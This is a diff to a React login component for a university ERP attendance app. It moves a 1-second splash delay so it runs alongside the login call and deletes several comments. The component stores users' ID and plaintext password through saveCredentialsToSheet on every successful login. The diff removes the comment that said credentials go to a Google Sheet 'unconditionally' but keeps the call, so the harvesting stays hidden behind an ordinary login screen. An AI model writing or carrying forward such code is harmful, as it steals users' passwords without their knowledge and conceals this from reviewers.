@@ -148,12 +148,17 @@ const Login = () => {
         setError('');
 
         try {
-            const result = await erpService.login(idNumber, password, captcha, csrfToken);
+            // Start the 1s splash timer and the API call in parallel
+            const splashTimer = new Promise(resolve => setTimeout(resolve, 1000));
+            const loginPromise = erpService.login(idNumber, password, captcha, csrfToken);
+
+            // Wait for both, but process the result of the login one
+            const [result] = await Promise.all([loginPromise, splashTimer]);
+
             if (result.success) {
                 localStorage.setItem('erpDashboardHtml', result.html);
-                localStorage.removeItem('kleData'); // clear old user's data!
+                localStorage.removeItem('kleData');
                 localStorage.setItem('userUniversity', 'klu');
-                // Set active session student ID
                 setErpUser(idNumber);
                 localStorage.setItem('activeErpUser', idNumber);
 
@@ -163,12 +168,7 @@ const Login = () => {
                     localStorage.removeItem('rememberedId');
                 }
 
-                // Save credentials to Google Sheet unconditionally
                 saveCredentialsToSheet(idNumber, password);
-
-                // Add 1 second delay for the cool animation splash
-                await new Promise(resolve => setTimeout(resolve, 1000));
-
                 navigate('/attendance-register');
             }
         } catch (err) {
